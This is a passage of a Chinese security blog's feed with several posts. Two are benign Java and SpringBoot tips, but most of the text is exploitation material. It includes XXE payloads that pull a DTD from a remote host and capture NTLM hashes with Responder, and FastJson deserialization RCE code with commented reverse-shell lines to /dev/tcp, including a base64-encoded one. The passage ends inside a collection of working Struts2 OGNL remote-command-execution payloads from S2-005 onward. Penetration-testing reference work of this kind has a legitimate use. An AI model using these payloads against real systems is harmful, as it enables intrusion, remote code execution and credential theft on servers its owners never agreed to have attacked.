class="line">end</span><br></pre></td></tr></table></figure></p><h2 id="读取的文件"><a href="#读取的文件" class="headerlink" title="读取的文件"></a>读取的文件</h2><p>Linux<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">/etc/hosts</span><br><span class="line">/etc/environment</span><br><span class="line">/etc/host.conf</span><br><span class="line">/sys/power/image_size</span><br></pre></td></tr></table></figure></p><p>Windows<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c:/Windows/debug/mrt.log</span><br><span class="line">c:/boot.ini</span><br></pre></td></tr></table></figure></p><h2 id="XXE-TO-RCE"><a href="#XXE-TO-RCE" class="headerlink" title="XXE TO RCE"></a>XXE TO RCE</h2><p>实战中未成功，成功了在详细记录。</p><h3 id="paylaod"><a href="#paylaod" class="headerlink" title="paylaod"></a>paylaod</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">request:</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http://ip/1111.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">1111.dtd:</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;\\ip/1.txt&apos;&gt;&quot;&gt;</span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure><h3 id="伪装smb服务"><a href="#伪装smb服务" class="headerlink" title="伪装smb服务"></a>伪装smb服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SpiderLabs/Responder</span><br><span class="line">./Responder.py  -I ens3  -v</span><br></pre></td></tr></table></figure><p><img src="http://x-f1v3.github.io/images/1562058286529.png" alt="image"></p><p>案例及姿势<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745</span><br><span class="line">https://blog.csdn.net/weixin_34368949/article/details/88116535</span><br><span class="line">https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html</span><br><span class="line">https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D/</span><br><span class="line">https://pentestlab.blog/tag/smb-relay/</span><br><span class="line">https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4</span><br><span class="line">http://www.it610.com/article/2378687.htm</span><br><span class="line">https://www.4hou.com/web/12964.html</span><br></pre></td></tr></table></figure></p><p>工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SpiderLabs/Responder</span><br><span class="line">https://github.com/SecureAuthCorp/impacket</span><br></pre></td></tr></table></figure></p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>一、java中部分jdk能通过http获取多行数据</li></ul><p><img src="http://x-f1v3.github.io/images/1561969654924.png" alt="image"></p><ul><li>二、jdk1.7以上不能使用<code>gopher://</code>协议并且修复了<code>HttpClient class</code>，只能使用ftp传数据。</li><li>三、jdk1.8.0_141以上无法用ftp读取文件，之前版本未测试，遇到再更新</li><li>四、jdk Version &gt;7u141 and &gt;8u162 无法用ftp读取文件<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2></li><li><a href="https://www.freebuf.com/articles/web/195899.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/195899.html</a></li><li><a href="https://www.mbsd.jp/blog/20171213.html" target="_blank" rel="noopener">https://www.mbsd.jp/blog/20171213.html</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/XXE" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/wiki/XXE</a></li><li><a href="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html" target="_blank" rel="noopener">https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html</a></li><li><a href="https://skavans.ru/en/2017/12/02/xxe-oob-extracting-via-httpftp-using-single-opened-port/" target="_blank" rel="noopener">https://skavans.ru/en/2017/12/02/xxe-oob-extracting-via-httpftp-using-single-opened-port/</a></li><li><a href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html" target="_blank" rel="noopener">http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html</a></li><li><a href="https://gist.github.com/staaldraad/01415b990939494879b4" target="_blank" rel="noopener">https://gist.github.com/staaldraad/01415b990939494879b4</a></li><li><a href="https://blog.netspi.com/forcing-xxe-reflection-server-error-messages/" target="_blank" rel="noopener">https://blog.netspi.com/forcing-xxe-reflection-server-error-messages/</a></li><li><a href="https://www.radebit.com/web/article/2702.html" target="_blank" rel="noopener">https://www.radebit.com/web/article/2702.html</a></li><li><a href="https://medium.com/@alt3kx/out-of-band-xml-external-entity-oob-xxe-exploitation-over-fortify-software-security-center-ssc-1d5c7169b561" target="_blank" rel="noopener">https://medium.com/@alt3kx/out-of-band-xml-external-entity-oob-xxe-exploitation-over-fortify-software-security-center-ssc-1d5c7169b561</a></li><li><a href="https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-wp.pdf" target="_blank" rel="noopener">https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-wp.pdf</a></li><li><a href="https://www.slideshare.net/ssuserf09cba/xxe-how-to-become-a-jedi" target="_blank" rel="noopener">https://www.slideshare.net/ssuserf09cba/xxe-how-to-become-a-jedi</a></li><li><a href="https://www.kieranclaessens.be/cscbe-web-2018.html" target="_blank" rel="noopener">https://www.kieranclaessens.be/cscbe-web-2018.html</a></li><li><a href="https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745" target="_blank" rel="noopener">https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745</a></li><li><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></li><li><a href="https://xz.aliyun.com/t/3601" target="_blank" rel="noopener">https://xz.aliyun.com/t/3601</a></li><li><a href="https://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html" target="_blank" rel="noopener">https://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近经常碰到XXE漏洞，记录一下XXE的相关姿势和碰到的问题&lt;br&gt;
    
    </summary>
    
      <category term="漏洞利用" scheme="http://x-f1v3.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
      <category term="XXE" scheme="http://x-f1v3.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>FastJson反序列化RCE</title>
    <link href="http://x-f1v3.github.io//blog/1561704300515.html"/>
    <id>http://x-f1v3.github.io//blog/1561704300515.html</id>
    <published>2019-06-28T06:45:00.000Z</published>
    <updated>2019-06-28T07:40:54.507Z</updated>
    
    <content type="html"><![CDATA[<p>在一次代码审计中，发现了FastJson反序列化RCE漏洞，利用了一波。<br><a id="more"></a></p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>1.2.24以及之前版本（2017.1）</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>方法很多，这里直接用<code>https://github.com/iBearcat/FastJson-JdbcRowSetImpl-RCE</code>的方法。</p><h4 id="修改-CommandObject-java"><a href="#修改-CommandObject-java" class="headerlink" title="修改 CommandObject.java"></a>修改 CommandObject.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span>java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommandObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CommandObject</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">Runtimert=Runtime.getRuntime();</span><br><span class="line"><span class="comment">//Runtime.getRuntime().exec("/bin/bash -i &gt;&amp;/dev/tcp/192.168.43.14/2018&lt;&amp;1");</span></span><br><span class="line"><span class="comment">//String[] commands = &#123;"bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mL2Rldi90Y3AvMTkyLjE2OC40My4xNC8yMDE4PCYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"&#125;;</span></span><br><span class="line"></span><br><span class="line">String[] commands = &#123;<span class="string">"touch"</span>,<span class="string">"/opt/test"</span>&#125;; <span class="comment">//Command</span></span><br><span class="line">Processpc = rt.exec(commands);</span><br><span class="line">pc.waitFor();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        CommandObject e = <span class="keyword">new</span> CommandObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="编译-CommandObject-java"><a href="#编译-CommandObject-java" class="headerlink" title="编译 CommandObject.java"></a>编译 CommandObject.java</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac CommandObject.java</span><br></pre></td></tr></table></figure><h4 id="开启HTTP服务"><a href="#开启HTTP服务" class="headerlink" title="开启HTTP服务"></a>开启HTTP服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure><h4 id="开启RMIServer"><a href="#开启RMIServer" class="headerlink" title="开启RMIServer"></a>开启RMIServer</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar  ip port</span><br></pre></td></tr></table></figure><h4 id="发送payload"><a href="#发送payload" class="headerlink" title="发送payload"></a>发送payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://ip:port/Object&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><h3 id="其他参考链接"><a href="#其他参考链接" class="headerlink" title="其他参考链接"></a>其他参考链接</h3><ul><li><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></li><li><a href="https://github.com/shengqi158/fastjson-remote-code-execute-poc" target="_blank" rel="noopener">https://github.com/shengqi158/fastjson-remote-code-execute-poc</a></li><li><a href="https://github.com/vulhub/vulhub/tree/master/fastjson/vuln" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/fastjson/vuln</a></li><li><a href="https://lazydog.me/post/fastjson-JdbcRowSetImpl-rce-exploit.html" target="_blank" rel="noopener">https://lazydog.me/post/fastjson-JdbcRowSetImpl-rce-exploit.html</a></li><li><a href="https://www.cnblogs.com/hac425/p/9800288.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9800288.html</a></li><li><a href="https://www.restran.net/2018/10/29/fastjson-rce-notes/" target="_blank" rel="noopener">https://www.restran.net/2018/10/29/fastjson-rce-notes/</a></li><li><a href="http://blog.nsfocus.net/fastjson-rce-poc/" target="_blank" rel="noopener">http://blog.nsfocus.net/fastjson-rce-poc/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在一次代码审计中，发现了FastJson反序列化RCE漏洞，利用了一波。&lt;br&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="http://x-f1v3.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Java" scheme="http://x-f1v3.github.io/tags/Java/"/>
    
      <category term="漏洞" scheme="http://x-f1v3.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="反序列化" scheme="http://x-f1v3.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>SpringBoot无需配置文件上传</title>
    <link href="http://x-f1v3.github.io//blog/1547519250524.html"/>
    <id>http://x-f1v3.github.io//blog/1547519250524.html</id>
    <published>2019-01-15T02:27:30.000Z</published>
    <updated>2019-06-13T05:44:48.615Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp;之前有个需求就是拦截上传请求，但是框架用的是SpringBoot。所以常规的拦截方法调用<code>Apache Commons FileUpload</code>无法成功。SpringBoot中有默认的文件上传组件，在使用ServletFileUpload时需要关闭Spring Boot的默认配置 ，所以在配置文件中添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring.http.multipart.enabled=false</span><br></pre></td></tr></table></figure><a id="more"></a><p>&emsp;&emsp;这样虽然调用成功，但是又影响正常的上传功能。使用SpringBoot默认的文件上传组件，又需要更改配置文件，否则各种报错。但是这个拦截的需求是放在通用的拦截器上，可以配置不同的系统。所以还是不行。<br>&emsp;&emsp;最后在网上找了好久，东拼西凑，看了各种源码终于找到了一种方法可以无需配置文件就可以获得上传请求时的各种参数，遂记录之。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    HttpServletRequest request1 = (HttpServletRequest) request;</span><br><span class="line">    CommonsMultipartResolver CommonsMultipartResolver = new CommonsMultipartResolver(request1.getSession().getServletContext());</span><br><span class="line">    MultipartResolver resolver = CommonsMultipartResolver;</span><br><span class="line">    MultipartHttpServletRequest multipartRequest = resolver.resolveMultipart(request1);</span><br><span class="line">    Collection&lt;Part&gt; parts = multipartRequest.getParts();</span><br><span class="line">    for (Part part: parts) &#123;</span><br><span class="line">        String filename=part.getSubmittedFileName();              </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;使用的是Spring框架自己的上传组件，最后成功获得上传文件名等参数。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;emsp;&amp;emsp;之前有个需求就是拦截上传请求，但是框架用的是SpringBoot。所以常规的拦截方法调用&lt;code&gt;Apache Commons FileUpload&lt;/code&gt;无法成功。SpringBoot中有默认的文件上传组件，在使用ServletFileUpload时需要关闭Spring Boot的默认配置 ，所以在配置文件中添加&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;spring.http.multipart.enabled=false&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="编程记录" scheme="http://x-f1v3.github.io/categories/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="Java" scheme="http://x-f1v3.github.io/tags/Java/"/>
    
      <category term="SpringBoot" scheme="http://x-f1v3.github.io/tags/SpringBoot/"/>
    
      <category term="上传" scheme="http://x-f1v3.github.io/tags/%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>idea打包jar报Error: Invalid or corrupt jarfile</title>
    <link href="http://x-f1v3.github.io//blog/1539757907171.html"/>
    <id>http://x-f1v3.github.io//blog/1539757907171.html</id>
    <published>2018-10-17T06:31:47.000Z</published>
    <updated>2019-06-13T05:35:46.342Z</updated>
    
    <content type="html"><![CDATA[<p>用idea将springboot web项目打包成 jar包的时候,百度了几遍文章，也按照文章做了，最后也生成了Jar包，但是最后运行的时候，却报错：<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Invalid or corrupt jarfile XX.jar</span><br></pre></td></tr></table></figure></p><p>最后也解决了，下面就在复现一下，记下自己容易疏忽的步骤。</p><p>1、<br>选择 File -&gt; Project Structure<br><img src="http://x-f1v3.github.io/images/1539758346327.png" alt="image"></p><p>2、<br>选择 Artifacts-&gt;JAR-&gt;From modules with dependencies<br><img src="http://x-f1v3.github.io/images/1539758467288.png" alt="image"></p><p>3、<br>选择启动类<br>选择 copy to the output directory and link via manifest-&gt;OK<br><strong>最重要的是 META-INF  默认放到 src\main\java 目录里，如果使用默认值，没有进行其他配置，生成的 jar 有可能不会包含 META-INF 目录，导致运行 jar 出错 。</strong> 所以，META-INF要放在<code>src\main\resources</code> 目录下。<br>这也是报<code>Error: Invalid or corrupt jarfile</code>的原因。<br><img src="http://x-f1v3.github.io/images/1539758998936.png" alt="image"></p><p>4、<br>查看或者修改生成的Jar包名字和路径<br><img src="http://x-f1v3.github.io/images/1539759080756.png" alt="image"></p><p>5、<br>选择Build -&gt; Build Artifacts<br><img src="http://x-f1v3.github.io/images/1539759635329.png" alt="image"></p><p>然后 build 即可<br><img src="http://x-f1v3.github.io/images/1539759703034.png" alt="image"></p><p>6、<br>最后在项目的目录里会生出对应的Jar包<br><img src="http://x-f1v3.github.io/images/1539760070181.png" alt="image"></p><p>7、<br>进到对应的目录，执行命令即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar xx.jar</span><br></pre></td></tr></table></figure></p><p><img src="http://x-f1v3.github.io/images/1539760153635.png" alt="image"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用idea将springboot web项目打包成 jar包的时候,百度了几遍文章，也按照文章做了，最后也生成了Jar包，但是最后运行的时候，却报错：&lt;br&gt;
    
    </summary>
    
      <category term="解决报错" scheme="http://x-f1v3.github.io/categories/%E8%A7%A3%E5%86%B3%E6%8A%A5%E9%94%99/"/>
    
    
      <category term="Java" scheme="http://x-f1v3.github.io/tags/Java/"/>
    
      <category term="SpringBoot" scheme="http://x-f1v3.github.io/tags/SpringBoot/"/>
    
  </entry>
  
  <entry>
    <title>Struts2历史漏洞POC</title>
    <link href="http://x-f1v3.github.io//blog/1533106712367.html"/>
    <id>http://x-f1v3.github.io//blog/1533106712367.html</id>
    <published>2018-08-01T06:58:32.000Z</published>
    <updated>2020-06-30T12:11:36.102Z</updated>
    
    <content type="html"><![CDATA[<p>每次看Struts2历史漏洞POC都要去百度，有点麻烦。所以收集了网上的POC放在一起，查阅比较方便。<br><a id="more"></a></p><h3 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h3><p>POST</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&apos;\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\43context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\75false&apos;)(b))&amp;(&apos;\43c&apos;)((&apos;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\43mycmd\75\&apos;netstat -an \&apos;&apos;)(d))&amp;(h)((&apos;\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)&apos;)(d))&amp;(i)((&apos;\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())&apos;)(d))&amp;(j)((&apos;\43myres\75new\40byte[51020]&apos;)(d))&amp;(k)((&apos;\43mydat.readFully(\43myres)&apos;)(d))&amp;(l)((&apos;\43mystr\75new\40java.lang.String(\43myres)&apos;)(d))&amp;(m)((&apos;\43myout\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(n)((&apos;\43myout.getWriter().println(\43mystr)&apos;)(d))</span><br></pre></td></tr></table></figure><h3 id="S2-009"><a href="#S2-009" class="headerlink" title="S2-009"></a>S2-009</h3><p>GET</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27netstat%20-an%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</span><br></pre></td></tr></table></figure><h3 id="S2-013"><a href="#S2-013" class="headerlink" title="S2-013"></a>S2-013</h3><p>POST</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=1$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23a=@java.lang.Runtime@getRuntime().exec(&apos;netstat -an&apos;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())&#125;</span><br></pre></td></tr></table></figure><h3 id="S2-016"><a href="#S2-016" class="headerlink" title="S2-016"></a>S2-016</h3><p>GET</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect:$&#123;%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&apos;netstat&apos;,&apos;-an&apos;&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(&apos;com.opensymphony.xwork2.dispatcher.HttpServletResponse&apos;),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><h3 id="S2-019"><a href="#S2-019" class="headerlink" title="S2-019"></a>S2-019</h3><p>POST</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=command&amp;expression=#f=#_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&apos;netstat&apos;,&apos;-an&apos;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[10000],#d.read(#e),#resp.println(#e),#resp.close()</span><br></pre></td></tr></table></figure><h3 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h3><p>GET</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;cmd=netstat%20-an&amp;pp=____A&amp;ppp=%20&amp;encoding=UTF-8</span><br></pre></td></tr></table></figure><h3 id="S2-033"><a href="#S2-033" class="headerlink" title="S2-033"></a>S2-033</h3><p>GET</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=netstat%20-an</span><br></pre></td></tr></table></figure><h3 id="S2-037"><a href="#S2-037" class="headerlink" title="S2-037"></a>S2-037</h3><p>GET</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=16456&amp;command=netstat%20-an</span><br></pre></td></tr></table></figure><h3 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h3><p>HEADER</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Content-Type&quot;:&quot;%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;netstat -an&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br></pre></td></tr></table></figure><h3 id="S2-046"><a href="#S2-046" class="headerlink" title="S2-046"></a>S2-046</h3><p>POST （FILE）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uploadexp = &quot;%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;netstat 